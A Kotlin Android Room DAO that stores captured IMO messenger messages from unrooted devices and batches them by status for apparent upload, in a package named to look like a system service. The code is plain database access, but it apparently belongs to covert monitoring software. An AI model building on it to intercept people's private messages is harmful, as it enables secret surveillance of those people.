package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.IMOUnrooted
import com.android.services.util.AppConstants

@Dao
interface IMOUnrootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(imoUnrooted: IMOUnrooted)

    @Query("Select uniqueId from imo_unrooted_table where uniqueId = :messageId")
    fun checkImoIfAlreadyExist(messageId: String): String?

    @Query("Select * from imo_unrooted_table where status = :status order by id ASC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllIMOUnrootedLogs(status: Int): List<IMOUnrooted>

    @Query("Update imo_unrooted_table set status = :updated_status where id BETWEEN :startId AND :endId")
    fun update(startId: Int, endId: Int, updated_status: Int): Int
}